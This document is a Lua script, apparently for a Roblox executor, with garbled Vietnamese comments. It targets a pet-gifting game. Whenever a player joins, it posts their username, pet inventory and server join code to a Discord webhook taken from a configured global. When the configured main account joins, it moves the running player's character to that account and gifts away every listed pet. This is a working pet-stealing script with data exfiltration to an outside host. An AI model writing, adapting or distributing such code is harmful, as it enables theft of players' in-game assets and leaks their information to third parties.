-- ‚úÖ Script ƒë√£ kh·ªüi ƒë·ªông
print("‚úÖ Script ƒë√£ kh·ªüi ƒë·ªông tr√™n executor n√†y!")

local MAIN_USER_ID = tonumber(getgenv().id)
local WEBHOOK_URL = tostring(getgenv().webhook or "")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

-- Danh s√°ch pet c√≥ th·ªÉ gift
local PET_NAMES = {
    "Bunny", "Dog", "Golden Lab", "Bee", "Black Bunny", "Cat", "Chicken", "Deer",
    "Monkey", "Orange Tabby", "Pig", "Rooster", "Spotted Deer", "Honey Bee", "Cow",
    "Polar Bear", "Sea Otter", "Silver Monkey", "Wasp", "Tarantula Hawk", "Turle",
    "Petal Bee", "Moth", "Brown Mouse", "Caterpillar", "Giant Ant", "Grey Mouse",
    "Praying Mantis", "Red Fox", "Red Giant Ant", "Snail", "Squirrel", "Bear Bee",
    "Butterfly", "Dragon Fly", "Queen Bee", "Disco Bee"
}

-- T√¨m player ch√≠nh trong server
local function getMainPlayer()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.UserId == MAIN_USER_ID then
            return p
        end
    end
    return nil
end

-- T√¨m pet trong Backpack ho·∫∑c Character
local function getAllValidPetTools()
    local tools = {}
    for _, container in ipairs({LocalPlayer:FindFirstChild("Backpack"), LocalPlayer.Character}) do
        if container then
            for _, tool in ipairs(container:GetChildren()) do
                if tool:IsA("Tool") then
                    for _, petName in ipairs(PET_NAMES) do
                        if tool.Name:match("^" .. petName) then
                            table.insert(tools, {tool = tool, name = petName})
                            break
                        end
                    end
                end
            end
        end
    end
    return tools
end

-- Move ƒë·∫øn ng∆∞·ªùi ch∆°i ch√≠nh
local function moveToPlayer(target)
    local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local tgt = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
    if hrp and tgt then
        local tween = TweenService:Create(hrp, TweenInfo.new(1), {
            CFrame = tgt.CFrame + Vector3.new(0, 0, 2)
        })
        tween:Play()
        tween.Completed:Wait()
    end
end

-- Gift pet
local function giftPetTo(player, petName)
    local giftRemote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")
    giftRemote:FireServer(player, petName)
end

-- Gift to√†n b·ªô pet ƒëang c√≥
local function autoGiftAllPets(mainPlayer)
    local pets = getAllValidPetTools()
    if #pets == 0 then return end

    moveToPlayer(mainPlayer)

    for _, pet in ipairs(pets) do
        local tool = pet.tool
        local petName = pet.name

        -- Trang b·ªã tool
        pcall(function()
            LocalPlayer.Character:WaitForChild("Humanoid"):EquipTool(tool)
        end)
        task.wait(0.2)

        -- Gift pet
        giftPetTo(mainPlayer, petName)
        task.wait(0.5)
    end
end

-- L·∫•y danh s√°ch pet ƒë·ªÉ g·ª≠i webhook
local function getPetList(player)
    local result = {}
    local containers = {player:FindFirstChild("Backpack"), player.Character}
    for _, container in ipairs(containers) do
        if container then
            for _, tool in ipairs(container:GetChildren()) do
                if tool:IsA("Tool") then
                    for _, petName in ipairs(PET_NAMES) do
                        if tool.Name:match("^" .. petName) then
                            table.insert(result, tool.Name)
                            break
                        end
                    end
                end
            end
        end
    end
    return result
end

-- G·ª≠i th√¥ng tin ng∆∞·ªùi ch∆°i v√†o Discord webhook
local function sendWebhook(player)
    if WEBHOOK_URL == "" then return end

    local petList = getPetList(player)
    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
    local content = {
        embeds = {{
            title = "üéÆ Ng∆∞·ªùi ch∆°i m·ªõi v√†o server",
            fields = {
                { name = "üë§ Username", value = player.DisplayName .. " (`" .. player.Name .. "`)", inline = false },
                { name = "üé≤ Game", value = gameName, inline = false },
                { name = "üì¶ Pet ƒëang s·ªü h·ªØu", value = #petList > 0 and table.concat(petList, "\n") or "Kh√¥ng c√≥ pet", inline = false },
                { name = "üîó Join Code", value = game.JobId or "Kh√¥ng r√µ", inline = false }
            },
            color = 65280
        }}
    }

    local req = {
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(content)
    }

    local sent = false
    if syn and syn.request then syn.request(req); sent = true
    elseif http_request then http_request(req); sent = true
    elseif request then request(req); sent = true
    end

    if sent then
        print("‚úÖ Webhook ƒë√£ g·ª≠i.")
    else
        warn("‚ö†Ô∏è Kh√¥ng g·ª≠i ƒë∆∞·ª£c webhook - executor kh√¥ng h·ªó tr·ª£.")
    end
end

-- Khi c√≥ ng∆∞·ªùi ch∆°i m·ªõi
Players.PlayerAdded:Connect(function(player)
    task.wait(3)
    sendWebhook(player)

    if player.UserId == MAIN_USER_ID then
        task.wait(6)
        autoGiftAllPets(player)
    end
end)
